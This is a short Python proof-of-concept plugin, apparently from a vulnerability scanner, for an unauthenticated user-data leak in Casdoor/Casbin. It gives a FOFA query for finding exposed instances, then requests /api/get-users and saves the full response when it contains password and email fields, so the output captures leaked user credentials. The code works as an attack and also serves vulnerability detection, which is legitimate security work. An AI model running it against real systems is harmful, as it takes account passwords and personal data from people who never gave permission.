#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/6f3aBZXxRHIJQIsEDnG5OQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Casbin 账号密码泄漏',

      'level'     :   'high',

      'FOFA'      :   'title="Casdoor"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/get-users?p=123&pageSize=123'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'owner.*?name.*?id.*?password.*?email.*?',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret